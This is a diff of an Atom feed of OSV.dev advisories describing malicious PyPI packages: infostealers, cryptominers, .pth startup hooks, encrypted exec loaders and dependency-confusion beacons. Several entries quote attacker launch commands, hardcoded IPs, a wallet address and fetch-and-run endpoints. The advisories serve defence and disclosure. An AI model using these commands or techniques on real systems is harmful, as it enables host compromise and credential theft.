+The package&amp;#x27;s PyPI metadata and README advertise prompt-preparation and input-normalization utilities, but the only shipped module (aiprepkit/deps.py) is an embedded-Python bootstrapper. It walks up to 8 parent directories searching for a sibling main.py or launcher.vbs, then downloads get-pip.py from bootstrap.pypa.io and installs requests and pywin32 into an adjacent./python/ tree, spawning subprocesses with CREATE_NO_WINDOW on Windows. No prompt/AI code is present. The module is not imported by aiprepkit/__init__.py and no entry_points or console_scripts are declared, so nothing runs at pip install or on import aiprepkit — the boots…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://x.com/L0Psec/status/2066540845893861386"&gt;https://x.com/L0Psec/status/2066540845893861386&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/aiprepkit"&gt;https://bad-packages.kam193.eu/pypi/package/aiprepkit&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/aiprepkit/0.1.2/"&gt;https://pypi.org/project/aiprepkit/0.1.2/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-11417"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-12080: Malicious code in bip39-py (PyPI)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-12080</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-12080"/>
+    <published>2026-08-05T05:00:57Z</published>
+    <updated>2026-08-05T06:36:44Z</updated>
+    <category term="PyPI"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in bip39-py (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;bip39-py&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: kam193 (c188f84ee0ad8238ed89a94673968e9f17c44d91d25dfe8012efd39e01705081)
+During installation, the package exfiltrates sensitive env variables, browser data, crypto wallets files, ssh keys and other configuration files.
+
+
+---
+
+Category: MALICIOUS - The campaign has clearly malicious intent, like infostealers.
+
+
+Campaign: 2026-08-bip39-py
+
+
+Reasons (based on the campaign):
+
+
+ - crypto-related
+
+
+ - The package overrides the install command in setup.py to execute malicious code during installation.
+
+
+ - exfiltration-crypto
+
+
+ - exfiltration-browser-data
+
+
+ - exfiltration-env-variables
+
+
+ - exfiltration-ssh-keys
+
+
+ - exfiltration-credentials
+
+
+ - uses-telegram-bot
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/bip39-py"&gt;https://bad-packages.kam193.eu/pypi/package/bip39-py&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-12080"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-12081: Malicious code in bitcoinlib-py (PyPI)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-12081</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-12081"/>
+    <published>2026-08-05T05:04:16Z</published>
+    <updated>2026-08-05T06:36:44Z</updated>
+    <category term="PyPI"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in bitcoinlib-py (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;bitcoinlib-py&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: kam193 (32582a69a108bf3ab34d8bd16122918dd29a56bff6f68a771b77c6c946bf9308)
+During installation, the package exfiltrates sensitive env variables, browser data, crypto wallets files, ssh keys and other configuration files.
+
+
+---
+
+Category: MALICIOUS - The campaign has clearly malicious intent, like infostealers.
+
+
+Campaign: 2026-08-bip39-py
+
+
+Reasons (based on the campaign):
+
+
+ - crypto-related
+
+
+ - The package overrides the install command in setup.py to execute malicious code during installation.
+
+
+ - exfiltration-crypto
+
+
+ - exfiltration-browser-data
+
+
+ - exfiltration-env-variables
+
+
+ - exfiltration-ssh-keys
+
+
+ - exfiltration-credentials
+
+
+ - uses-telegram-bot
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/bitcoinlib-py"&gt;https://bad-packages.kam193.eu/pypi/package/bitcoinlib-py&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-12081"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
   <entry>
     <title>[UPDATED] MAL-2026-10672: Malicious code in northstart-sdk (PyPI)</title>
     <id>https://osv.dev/vulnerability/MAL-2026-10672</id>
@@ -66,34 +626,6 @@ _-= Per source details. Do not edit below this line.=-_
 The package&amp;#x27;s setup.py issues an install-time HTTP request to the hardcoded bare-IP URL http://167.233.212.138/cb/db27bcff144c059f/nvtorch_oot_nightly using urlopen with a 5-second timeout. The request fires automatically on `pip install`, notifying the operator of the remote endpoint that the package was installed and leaking the installer&amp;#x27;s source IP and network metadata over plain HTTP. The package name (`nvtorch-oot-nightly`) and version (`99999.0.1`) shadow a plausible internal NVIDIA/PyTorch namespace with a high version to win resolution against an internal index — the canonical dependency-confusion shape. The path component `cb…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/nvtorch-oot-nightly"&gt;https://bad-packages.kam193.eu/pypi/package/nvtorch-oot-nightly&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/nvtorch-oot-nightly/99999.0.0/"&gt;https://pypi.org/project/nvtorch-oot-nightly/99999.0.0/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/nvtorch-oot-nightly/99999.0.1/"&gt;https://pypi.org/project/nvtorch-oot-nightly/99999.0.1/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-11425"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
   <entry>
-    <title>[UPDATED] MAL-2026-10868: Malicious code in neroteam-v1 (PyPI)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-10868</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-10868"/>
-    <published>2026-07-20T08:06:19Z</published>
-    <updated>2026-08-04T23:05:49Z</updated>
-    <category term="PyPI"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in neroteam-v1 (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;neroteam-v1&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (e8a87642ea3c7a291704b2306a242bb496048571efcafb63835055f0871aed19)
-Importing the `nero` package triggers `nero/__init__.py` to load `nero.main`, whose top-level code runs a `_guard()` routine before executing a hidden payload. `_guard()` performs anti-debug checks (`sys.gettrace`, `sys.settrace(None)`, `_getframe().f_trace`), timing checks, and substring matching against sandbox/VM indicators (`sandbox`, `virtualbox`, `vmware`, `qemu`, `wine`, `hyperv`, `xen`) in PATH, the Python executable path, and processor identifiers. It then base64-decodes a ~110KB blob, decrypts it with a custom RC4-like keystream cipher keyed by the string `Cxdgs`, and passes the plaintext to `exec()`. The decrypted code is op…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/neroteam-v1"&gt;https://bad-packages.kam193.eu/pypi/package/neroteam-v1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/neroteam-v1/1.0.6/"&gt;https://pypi.org/project/neroteam-v1/1.0.6/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/neroteam-v1/1.0.5/"&gt;https://pypi.org/project/neroteam-v1/1.0.5/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/neroteam-v1/1.0.4/"&gt;https://pypi.org/project/neroteam-v1/1.0.4/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/neroteam-v1/1.0.7/"&gt;https://pypi.org/project/neroteam-v1/1.0.7/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-10868"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-10866: Malicious code in nemopush (PyPI)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-10866</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-10866"/>
-    <published>2026-07-20T05:15:31Z</published>
-    <updated>2026-08-04T23:05:49Z</updated>
-    <category term="PyPI"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in nemopush (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;nemopush&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (58d2958d0307dfe5b73dc1eef5a46e96c25f94ea31a0b4ab8b43a1878d427d2d)
-The package advertises itself as &amp;#x27;A push notification package&amp;#x27; but ships an ~8.6 MB opaque ELF x86-64 binary named `claude` and a `start.sh` wrapper as package data (declared in pyproject.toml under [tool.setuptools.package-data]). The pypi entry point `nemopush-run` (nemopush.main:run) invokes `subprocess.run([&amp;quot;bash&amp;quot;, script_path])`, and `start.sh` runs `chmod +x./claude` followed by `./claude --host 45.151.62.119:3361 --user &amp;lt;hardcoded per-install token&amp;gt;`. Running the advertised command executes attacker-controlled native code on the installer&amp;#x27;s host that establishes an outbound connection to a hardcoded bare-IP endpoint, identifying…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/nemopush"&gt;https://bad-packages.kam193.eu/pypi/package/nemopush&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/newbroughblueogwin/automatic-octo-invention"&gt;https://github.com/newbroughblueogwin/automatic-octo-invention&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/nemopush/0.1.1/"&gt;https://pypi.org/project/nemopush/0.1.1/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/nemopush/0.1.3/"&gt;https://pypi.org/project/nemopush/0.1.3/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/nemopush/0.1.2/"&gt;https://pypi.org/project/nemopush/0.1.2/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-10866"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
     <title>[UPDATED] MAL-2026-10919: Malicious code in ml-core-airflow-auth (PyPI)</title>
     <id>https://osv.dev/vulnerability/MAL-2026-10919</id>
     <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-10919"/>
@@ -120,20 +652,6 @@ _-= Per source details. Do not edit below this line.=-_
 
 ## Source: amazon-inspector (e2dfb4e3eedab24e355b6d24db6096e6752563e220d28e83ad2cf213fe49fd89)
 The package ships an 8.6 MB stripped ELF binary at automatic_octo_invention/claw (sha256 f6fe45f8fe9081987505af31f0249021a65b558af514f2e4e37340fb3182805f) with no source, no build metadata, and no documentation beyond the package name. The console-script entry point (`cli.py`) chmods the bundled `start.sh` executable and invokes it via subprocess; `start.sh` in turn chmods and runs `./claw --host 45.151.62.119:3361 --user prl1p2jan4d...` — a bare-IP endpoint on a non-standard port with a fixed 62-character wallet-shaped user identifier. The argument shape matches XMRig-family cryptocurrency miners. The package&amp;#x27;s README and description …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/automatic-octo-invention"&gt;https://bad-packages.kam193.eu/pypi/package/automatic-octo-invention&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/newbroughblueogwin/automatic-octo-invention"&gt;https://github.com/newbroughblueogwin/automatic-octo-invention&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/automatic-octo-invention/0.1.2/"&gt;https://pypi.org/project/automatic-octo-invention/0.1.2/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/automatic-octo-invention/0.1.1/"&gt;https://pypi.org/project/automatic-octo-invention/0.1.1/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/automatic-octo-invention/0.1.3/"&gt;https://pypi.org/project/automatic-octo-invention/0.1.3/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/automatic-octo-invention/0.1.0/"&gt;https://pypi.org/project/automatic-octo-invention/0.1.0/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-10918"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-11094: Malicious code in cfgzen (PyPI)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-11094</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-11094"/>
-    <published>2026-07-27T22:02:50Z</published>
-    <updated>2026-08-04T23:05:48Z</updated>
-    <category term="PyPI"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in cfgzen (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;cfgzen&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (a904eba641878bae63f76595a468b0faaa66fd27104ac557249e457f005c3fb1)
-The package installs a site-wide `cfgzen.pth` containing `import dotcfg`, which Python&amp;#x27;s site machinery executes automatically at every interpreter startup — turning every `python` invocation on the host into a trigger for the payload. On import, `dotcfg/__init__.py` spawns a detached background Python subprocess (env-gated with `_CFGZ_BG=1` and `CREATE_NO_WINDOW` on Windows) that re-imports the package and calls `_native.platform_check()` in the shipped Windows PyO3 extension `dotcfg/_native.pyd`. The native module contains: a hardcoded anonymous file-drop endpoint at `files.catbox.moe/7t4wyu.*`; WinHTTP and raw ws2_32 socket primitiv…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.virustotal.com/gui/file/051dc1df4ea14c71a25fea528090dd8cfd2c4e02030e6d2f91f6f2f9bad90ec3/detection"&gt;https://www.virustotal.com/gui/file/051dc1df4ea14c71a25fea528090dd8cfd2c4e02030e6d2f91f6f2f9bad90ec3/detection&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://tria.ge/260727-1xjeksde39"&gt;https://tria.ge/260727-1xjeksde39&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/cfgzen"&gt;https://bad-packages.kam193.eu/pypi/package/cfgzen&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/cfgzen/1.0.6/"&gt;https://pypi.org/project/cfgzen/1.0.6/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/cfgzen/1.0.5/"&gt;https://pypi.org/project/cfgzen/1.0.5/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/cfgzen/1.0.2/"&gt;https://pypi.org/project/cfgzen/1.0.2/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/cfgzen/1.0.4/"&gt;https://pypi.org/project/cfgzen/1.0.4/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/cfgzen/1.0.3/"&gt;https://pypi.org/project/cfgzen/1.0.3/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-11094"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
   <entry>
     <title>[UPDATED] MAL-2026-10985: Malicious code in animated-octo-spoon (PyPI)</title>
@@ -248,20 +766,6 @@ _-= Per source details. Do not edit below this line.=-_
 The package presents itself as a &amp;#x27;Kimi&amp;#x27; chat runtime but bundles a 32MB ELF binary at resources/kimichat that is ForgeMiner 1.4.1, a CUDA GPU cryptominer supporting KawPow/Pearl/Xelis/Cryptix algorithms (embedded strings include &amp;#x27;ForgeMiner/1.4.1&amp;#x27;, &amp;#x27;mining.authorize&amp;#x27;, &amp;#x27;mining.subscribe&amp;#x27;, &amp;#x27;pearl.set_mining&amp;#x27;). The kimitalk-run console_script defined by the package invokes core.py&amp;#x27;s run(), which executes subprocess.run([&amp;#x27;bash&amp;#x27;, str(launcher),...]) against a bundled start.sh. start.sh exports FORGE_WALLET=prl1p2jan4dvkdfkt5r3pra7z96axrxjyjcgat9w7ldetlcy9wffm569sc9ux2t and POOL=45.151.62.119:3361 and then chmods and executes./kimitalk, dire…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/kimitalk"&gt;https://bad-packages.kam193.eu/pypi/package/kimitalk&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/newbroughblueogwin/automatic-octo-invention"&gt;https://github.com/newbroughblueogwin/automatic-octo-invention&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/kimitalk/0.1.2/"&gt;https://pypi.org/project/kimitalk/0.1.2/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/kimitalk/0.1.0/"&gt;https://pypi.org/project/kimitalk/0.1.0/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/kimitalk/0.1.1/"&gt;https://pypi.org/project/kimitalk/0.1.1/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-10865"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
   <entry>
-    <title>[UPDATED] MAL-2026-11195: Malicious code in phabricator-client (PyPI)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-11195</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-11195"/>
-    <published>2026-07-30T08:51:50Z</published>
-    <updated>2026-08-04T23:05:47Z</updated>
-    <category term="PyPI"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in phabricator-client (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;phabricator-client&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (43e718b20986295f99dd35066e46d0be5629555dccab79a1727cd3f5044cb7a0)
-phabricator-client 99.0.4 is a single-file PyPI package whose only runtime effect on import is to resolve lobohunter.duckdns.org and open a TCP connection to port 9999 on that host. The callout is unconditional and fires as soon as the module is imported, leaking the installer&amp;#x27;s public IP address and confirming code execution on the importing host to the operator of the DuckDNS endpoint. The package ships with placeholder metadata (no description, author, or homepage) and an implausibly inflated version number (99.0.4) intended to win resolution over an internal or lower-versioned package of a similar name — the standard dependency-con…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/phabricator-client"&gt;https://bad-packages.kam193.eu/pypi/package/phabricator-client&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/phabricator-client/99.0.4/"&gt;https://pypi.org/project/phabricator-client/99.0.4/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-11195"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
     <title>[UPDATED] MAL-2026-10986: Malicious code in comp-colors (PyPI)</title>
     <id>https://osv.dev/vulnerability/MAL-2026-10986</id>
     <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-10986"/>
@@ -288,20 +792,6 @@ _-= Per source details. Do not edit below this line.=-_
 
 ## Source: amazon-inspector (05f3b08a41e5239924e109a14b8d91b4542bbbdddb1138a1bc6c9cfb7137b053)
 The package publishes as &amp;#x27;colorstack&amp;#x27; with a summary advertising a color/gradient library, but installs under the import name &amp;#x27;newcolors&amp;#x27; and exposes two functions unrelated to color generation. The exported colors() function POSTs to the hardcoded endpoint https://www.fastsyncapi.com/v1/colors, writes the response body to a temporary file preserving the server-supplied filename extension, and dispatches it through the OS via os.startfile on Windows or subprocess.run with open/xdg-open on macOS/Linux. Because the remote server chooses both the filename and the bytes, extensions such as.exe/.bat/.ps1/.lnk on Windows or.command/.desktop/…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/colorstack"&gt;https://bad-packages.kam193.eu/pypi/package/colorstack&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/colorstack/0.1.0/"&gt;https://pypi.org/project/colorstack/0.1.0/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/colorstack/0.1.1/"&gt;https://pypi.org/project/colorstack/0.1.1/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-10976"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-10917: Malicious code in tinkoff-cloud-apis-internal (PyPI)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-10917</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-10917"/>
-    <published>2026-07-18T14:14:02Z</published>
-    <updated>2026-08-04T22:05:26Z</updated>
-    <category term="PyPI"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in tinkoff-cloud-apis-internal (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;tinkoff-cloud-apis-internal&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (421b85b858849bbf116303f2dc2740180df602dfc162f7ce7fa109e4c39b07ff)
-The package installs a telemetry.pth file into site-packages via a custom install cmdclass; the.pth line imports _telemetry_init, causing every subsequent Python interpreter startup on the host to spawn a background thread that fetches and executes attacker-controlled binaries. The bootstrap resolves platform-specific payload paths (/pkg/package, /pkg/package-arm64, /pkg/loader_mac, /pkg/package.exe) from a rotating set of anonymous Cloudflare Workers mirrors (package-proxy.cf5oobworker.workers.dev, cf8oobworker, cf12oobworker, cf17-ddb, cf25-6eb.workers.dev) with a DNS-over-UDP TXT covert-channel fallback (tin.dl.well1.site, tina.dl.w…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/tinkoff-cloud-apis-internal"&gt;https://bad-packages.kam193.eu/pypi/package/tinkoff-cloud-apis-internal&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.virustotal.com/gui/file/06f1c2f0c66cf13ab6702414e8dce7c4115939f3e9cf95e9a8baade58961c016/detection"&gt;https://www.virustotal.com/gui/file/06f1c2f0c66cf13ab6702414e8dce7c4115939f3e9cf95e9a8baade58961c016/detection&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.virustotal.com/gui/file/230f81f18608800912def92e18999874e004cd9fb4a554f759f77e4dd2030081/detection"&gt;https://www.virustotal.com/gui/file/230f81f18608800912def92e18999874e004cd9fb4a554f759f77e4dd2030081/detection&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.virustotal.com/gui/file/c98444d6aebfd87f2f4412e1d7aafe8fe3fe080139ca1111049ea83fe828cd1d/detection"&gt;https://www.virustotal.com/gui/file/c98444d6aebfd87f2f4412e1d7aafe8fe3fe080139ca1111049ea83fe828cd1d/detection&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.virustotal.com/gui/file/1360bb7437f5e7790747bc4e31eedcd19f88f23b20362a42368f4179b8b9e27d/detection"&gt;https://www.virustotal.com/gui/file/1360bb7437f5e7790747bc4e31eedcd19f88f23b20362a42368f4179b8b9e27d/detection&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://tria.ge/260720-teqmlshs6y/behavioral1"&gt;https://tria.ge/260720-teqmlshs6y/behavioral1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/tinkoff-cloud-apis-internal/8.5.4/"&gt;https://pypi.org/project/tinkoff-cloud-apis-internal/8.5.4/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/tinkoff-cloud-apis-internal/8.5.3/"&gt;https://pypi.org/project/tinkoff-cloud-apis-internal/8.5.3/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-10917"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
   <entry>
     <title>[UPDATED] MAL-2026-10927: Malicious code in roles-royce (PyPI)</title>
@@ -332,20 +822,6 @@ _-= Per source details. Do not edit below this line.=-_
 On `import wacve_utils`, the package&amp;#x27;s `__init__.py` unconditionally invokes `check_for_updates()`, which HTTP-fetches a hardcoded GitHub Gist under the user `Darknet-Hacker` (gist.githubusercontent.com/Darknet-Hacker/7f7e01a86e68403a457c4cd0c2d93f1d/raw/), base64-decodes the body, XORs it with a key derived from the string `wacve_utils`, zlib-decompresses it, `marshal.loads` a Python code object, and `exec`s it in-process. If the Gist fetch fails, the module falls back to shipped opaque blobs `config-linux.dat` / `config-termux.dat` (selected by a Termux/Linux platform branch) and runs them through the same base64+XOR+zlib+marshal dec…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/wacve-utils"&gt;https://bad-packages.kam193.eu/pypi/package/wacve-utils&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/wacve-utils/1.0.7/"&gt;https://pypi.org/project/wacve-utils/1.0.7/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-11428"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
   <entry>
-    <title>[UPDATED] MAL-2026-10916: Malicious code in python-devplatform-client (PyPI)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-10916</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-10916"/>
-    <published>2026-07-18T14:13:52Z</published>
-    <updated>2026-08-04T22:05:26Z</updated>
-    <category term="PyPI"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in python-devplatform-client (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;python-devplatform-client&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (8daa66fc6fa92869318e5a544d82fab2d5dff870dc4c6784f28733f84441415a)
